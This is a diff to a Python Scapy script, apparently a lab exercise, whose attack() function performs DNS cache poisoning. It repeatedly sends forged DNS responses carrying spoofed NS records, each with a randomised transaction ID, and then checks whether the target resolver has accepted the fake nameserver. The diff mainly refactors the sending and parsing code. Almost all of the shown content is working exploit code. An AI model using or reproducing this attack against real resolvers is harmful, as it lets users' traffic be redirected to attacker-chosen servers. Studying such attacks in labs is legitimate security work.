@@ -61,14 +61,13 @@ def exampleSendDNSQuery():
 def attack():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
     sock.bind((my_ip, my_port))
-    
 
+    dns_request = DNS(rd=1, qd=DNSQR(qname=base_domain))
     fake_response = DNS(id=42, qr=1, rd=1, ra=1, qdcount=1, ancount=1, nscount=1, arcount=0, 
 		qd=DNSQR(qname=base_domain, qtype=1, qclass=1), 
 		an=DNSRR(rrname=base_domain, ttl=70000, rdata='1.2.3.4', rdlen=4),
 		ns=DNSRR(rrname=base_domain, rclass=1, ttl=70000, rdata=spoof, rdlen=len(spoof)+1, type=2)
 	)
-    dns_request = DNS(rd=1, qd=DNSQR(qname=base_domain))
 
     while (1):
         # per new url:
@@ -78,25 +77,23 @@ def attack():
         fake_response[DNS].an.rrname = url
 
         # send dns query
-        sock.sendto(bytes(dns_request), (my_ip, dns_port))
+        sendPacket(sock, dns_request, my_ip, dns_port)
         for i in range(60):
             fake_response[DNS].id = getRandomTXID()
-            # print "TXID = %s" % str(fake_response[DNS].id)
-            sock.sendto(bytes(fake_response), (my_ip, query_port))
+            sendPacket(sock, fake_response, my_ip, query_port)
 
         # check to see if it worked
-        sock.sendto(bytes(dns_request), (my_ip, dns_port))
-        data = sock.recv(4096)
+        sendPacket(sock, dns_request, my_ip, dns_port)
+        response = sock.recv(4096)
+        response = DNS(response)
         try:
-            res = DNS(data[2:])
-            if res[DNS].ns and res[DNS].ns.rdata == spoof:
+            if response[DNS].ns.rdata == spoof:
                 print "Successfully poisonned our target with a dummy record !!"
-                break
+                exit(0)
             else:
-                print "Poisonning on %s failed, ns is %s" % (url, res[DNS].ns[0].rdata)
-                print res.show()
+                print "Poisonning on %s failed, ns is %s" % (url, str(response[DNS].ns))
         except:
-            print "Poisonning on %s failed, response is \n%s" % (url, DNS(data).show())
+            print "Poisonning on %s failed, response is \n%s" % (url, response.show())
     
 
 if __name__ == '__main__':
